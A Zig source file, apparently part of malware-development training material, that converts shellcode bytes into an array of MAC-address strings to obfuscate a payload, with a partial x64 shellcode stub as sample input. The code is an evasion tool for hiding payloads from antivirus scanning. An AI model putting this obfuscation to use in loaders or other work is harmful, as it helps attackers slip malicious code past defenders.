const std = @import("std");

/// Generates a MAC address string from 6 raw bytes
fn generateMAC(a: u8, b: u8, c: u8, d: u8, e: u8, f: u8, buffer: []u8) []const u8 {
    // Format the 6 bytes as a MAC address string (XX-XX-XX-XX-XX-XX)
    return std.fmt.bufPrint(buffer, "{X:0>2}-{X:0>2}-{X:0>2}-{X:0>2}-{X:0>2}-{X:0>2}", .{
        a, b, c, d, e, f,
    }) catch unreachable;
}

/// Generate the MAC output representation of the shellcode
fn generateMacOutput(pShellcode: []const u8, writer: anytype) !bool {
    const shellcodeSize = pShellcode.len;

    // If the shellcode buffer is empty or the size is not a multiple of 6, exit
    if (shellcodeSize == 0 or shellcodeSize % 6 != 0) {
        return false;
    }

    try writer.print("const mac_array = [_][*:0]const u8{{\n\t", .{});

    // Buffer to hold the MAC address string (XX-XX-XX-XX-XX-XX = 17 chars + null)
    var macBuffer: [32]u8 = undefined;

    var counter: usize = 0;

    // Process the shellcode in groups of 6 bytes
    var i: usize = 0;
    while (i < shellcodeSize) {
        // Generate a MAC address from the current 6 bytes
        const mac = generateMAC(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3], pShellcode[i + 4], pShellcode[i + 5], &macBuffer);

        counter += 1;

        // Print the MAC address
        if (i == shellcodeSize - 6) {
            // Last MAC address
            try writer.print("\"{s}\"", .{mac});
        } else {
            // Not the last one, add comma
            try writer.print("\"{s}\", ", .{mac});
        }

        // Move to the next group of 6 bytes
        i += 6;

        // Add a newline for formatting after every 6 MAC addresses
        if (counter % 6 == 0 and i < shellcodeSize) {
            try writer.print("\n\t", .{});
        }
    }

    try writer.print("\n}};\n\n", .{});
    return true;
}

pub fn main() !void {
    // Example shellcode (must be a multiple of 6 bytes)
    const shellcode = [_]u8{
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, // 1st MAC
        0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, // 2nd MAC
        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, // 3rd MAC
        0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, // 4th MAC
        0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, // 5th MAC
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, // 6th MAC
        0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, // 7th MAC
    };

    // Use stdout as the writer
    const stdout = std.io.getStdOut().writer();

    std.debug.print("[+] Generating MAC address representation for {} bytes of shellcode\n", .{shellcode.len});

    // Generate and print the MAC address representation
    if (try generateMacOutput(&shellcode, stdout)) {} else {
        std.debug.print("[!] Failed to generate MAC address representation\n", .{});
    }
}
